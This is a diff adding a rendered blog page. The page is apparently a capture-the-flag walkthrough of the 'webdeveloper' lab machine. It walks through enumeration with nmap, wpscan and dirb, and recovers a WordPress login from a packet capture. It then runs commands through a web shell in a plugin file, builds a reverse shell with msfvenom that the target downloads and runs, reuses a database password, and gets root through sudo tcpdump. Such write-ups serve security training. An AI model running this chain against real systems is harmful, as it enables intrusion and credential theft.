@@ -1,0 +1,198 @@
+I"ª8<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/webdeveloper<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.0/24  
+ Currently scanning: Finished!   |   Screen View: Unique Hosts      
+                                                                   
+ 6 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 342      
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ <span class="nt">-----------------------------------------------------------------------------</span>
+ 192.168.179.184 00:0c:29:fc:85:b7      5     300  VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/webdeveloper<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-p1-65535</span> <span class="nt">-T4</span> <span class="nt">-Pn</span> 192.168.179.184 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/webdeveloper<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 192.168.179.184 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 d2:ac:73:4c:17:ec:6a:82:79:87:5a:f9:22:d4:12:cb <span class="o">(</span>RSA<span class="o">)</span>
+|   256 9c:d5:f3:2c:e2:d0:06:cc:8c:15:5a:5a:81:5b:03:3d <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 ab:67:56:69:27:ea:3e:3b:33:73:32:f8:ff:2e:1f:20 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-generator: WordPress 4.9.8
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Example site &amp;#8211<span class="p">;</span> Just another WordPress site
+...
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p><img src="/assets/images/webdeveloper/screenshot-1.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/webdeveloper<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://192.168.179.184/ <span class="nt">--enumerate</span> vp,vt,u,dbe
+...
+<span class="o">[</span>+] Upload directory has listing enabled: http://192.168.179.184/wp-content/uploads/                                                                                
+ | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>                                                                                                                   
+ | Confidence: 100% 
+ ...
+ <span class="o">[</span>+] webdeveloper
+ | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+ | Confirmed By:
+ |  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |   - http://192.168.179.184/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
+ |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ ...
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/webdeveloper<span class="nv">$ </span>dirb http://192.168.179.184/ <span class="nt">-r</span>
+
+<span class="nt">----</span> Scanning URL: http://192.168.179.184/ <span class="nt">----</span>                                                                                                                     
++ http://192.168.179.184/index.php <span class="o">(</span>CODE:301|SIZE:0<span class="o">)</span>                                                                                                                
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.184/ipdata/                                                                                                                       
++ http://192.168.179.184/server-status <span class="o">(</span>CODE:403|SIZE:303<span class="o">)</span>                                                                                                          
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.184/wp-admin/                                                                                                                     
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.184/wp-content/                                                                                                                   
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.184/wp-includes/                                                                                                                  
++ http://192.168.179.184/xmlrpc.php <span class="o">(</span>CODE:405|SIZE:42<span class="o">)</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/webdeveloper/screenshot-2.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/webdeveloper<span class="nv">$ </span>wget http://192.168.179.184/ipdata/analyze.cap
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/webdeveloper<span class="nv">$ </span>wireshark &amp;
+</code></pre></div></div>
+
+<p><img src="/assets/images/webdeveloper/screenshot-3.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/webdeveloper<span class="nv">$ </span>urlencode <span class="nt">-d</span> <span class="s1">'Te5eQg%264sBS%21Yr%24%29wf%25%28DcAd'</span>
+Te5eQg&amp;4sBS!Yr<span class="nv">$)</span>wf%<span class="o">(</span>DcAd
+</code></pre></div></div>
+
+<p><img src="/assets/images/webdeveloper/screenshot-4.png" alt="" /></p>
+
+<p><img src="/assets/images/webdeveloper/screenshot-5.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="wordpress">Wordpress</h3>
+
+<p><img src="/assets/images/webdeveloper/screenshot-6.png" alt="" /></p>
+
+<p><img src="/assets/images/webdeveloper/screenshot-7.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/webdeveloper<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.184/wp-content/plugins/akismet/akismet.php?cmd=</span><span class="si">$(</span>urlencode <span class="nt">-m</span> <span class="s1">'uname -a'</span><span class="si">)</span><span class="s2">"</span>
+Linux webdeveloper 4.15.0-38-generic <span class="c">#41-Ubuntu SMP Wed Oct 10 10:59:38 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
+</code></pre></div></div>
+
+<p>we generate a linux payload</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/webdeveloper<span class="nv">$ </span>msfvenom <span class="nt">-a</span> x64 <span class="nt">--platform</span> linux <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.179.1 <span class="nv">lport</span><span class="o">=</span>443 <span class="nt">-f</span> elf <span class="nt">-o</span> evil
+</code></pre></div></div>
+
+<p>start a python web server</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/webdeveloper<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/webdeveloper<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.184/wp-content/plugins/akismet/akismet.php?cmd=</span><span class="si">$(</span>urlencode <span class="nt">-m</span> <span class="s1">'curl 192.168.179.1/evil -o /tmp/evil &amp;&amp; chmod +x /tmp/evil &amp;&amp; /tmp/evil'</span><span class="si">)</span><span class="s2">"</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/webdeveloper<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.184] 36790
+script <span class="nt">-qc</span> /bin/bash /dev/null
+www-data@webdeveloper:/var/www/html/wp-content/plugins/akismet<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Listing the wordpres Mysql connection</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webdeveloper:/var/www/html<span class="nv">$ </span><span class="nb">head</span> <span class="nt">-n</span> 40 wp-config.php
+...
+// <span class="k">**</span> MySQL settings - You can get this info from your web host <span class="k">**</span> //
+/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'wordpress'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL database username <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'webdeveloper'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL database password <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'MasterOfTheUniverse'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> Database Charset to use <span class="k">in </span>creating database tables. <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_CHARSET'</span>, <span class="s1">'utf8mb4'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> The Database Collate type. Don<span class="s1">'t change this if in doubt. */
+define('</span>DB_COLLATE<span class="s1">', '');
+...
+</span></code></pre></div></div>
+
+<p>switching to the user webdeveloper</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webdeveloper:/var/www/html<span class="nv">$ </span>su - webdeveloper
+su - webdeveloper
+Password: MasterOfTheUniverse
+
+webdeveloper@webdeveloper:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>tcpdump sudo permissions</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>webdeveloper@webdeveloper:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>webdeveloper: MasterOfTheUniverse
+
+Matching Defaults entries <span class="k">for </span>webdeveloper on webdeveloper:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User webdeveloper may run the following commands on webdeveloper:
+    <span class="o">(</span>root<span class="o">)</span> /usr/sbin/tcpdump
+webdeveloper@webdeveloper:~<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-permissions">Sudo Permissions</h3>
+
+<p>https://gtfobins.github.io/gtfobins/tcpdump</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>webdeveloper@webdeveloper:~<span class="nv">$ </span><span class="nb">sudo </span>tcpdump <span class="nt">-ln</span> <span class="nt">-i</span> lo <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> /tmp/evil <span class="nt">-Z</span> root
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/webdeveloper<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.184] 39914
+script <span class="nt">-qc</span> /bin/bash /dev/null
+root@webdeveloper:/home/webdeveloper#
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@webdeveloper:/home/webdeveloper# <span class="nb">cd</span> /root
+<span class="nb">cd</span> /root
+root@webdeveloper:/root# <span class="nb">ls 
+ls 
+</span>flag.txt
+root@webdeveloper:/root# <span class="nb">cat </span>flag.txt
+<span class="nb">cat </span>flag.txt
+Congratulations here is youre flag:
+cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290
+root@webdeveloper:/root#
+</code></pre></div></div>
+:ET
